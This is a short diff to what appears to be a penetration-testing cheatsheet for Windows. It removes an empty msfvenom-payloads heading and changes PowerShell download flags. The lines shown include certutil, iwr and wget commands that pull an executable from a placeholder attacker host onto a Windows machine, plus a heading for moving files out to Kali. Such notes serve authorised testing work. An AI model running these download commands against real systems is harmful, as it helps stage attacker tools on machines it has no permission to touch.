@@ -60,11 +60,6 @@ If the above does not work due to a privilege error  `psshutdown64.exe` from sys
 
 ## Windows Commands Cheatsheet
 
-**msfvenom payloads:**
-
-```bash
-```
-
 **File transfer to Windows:**
 
 ```cmd
@@ -74,9 +69,9 @@ certutil -urlcache -f http://<ip>/file.exe file.exe
 
 ```powershell
 # PowerShell iwr
-iwr -uri http://<ip>/file.exe -Outfile file.exe
+iwr -uri http://<ip>/file.exe -o file.exe
 # PowerShell wget
-powershell wget -Uri <url> -Outfile file.exe
+powershell wget -Uri <url> -o file.exe
 ```
 
 **File transfer from Windows to Kali (SMB server):**
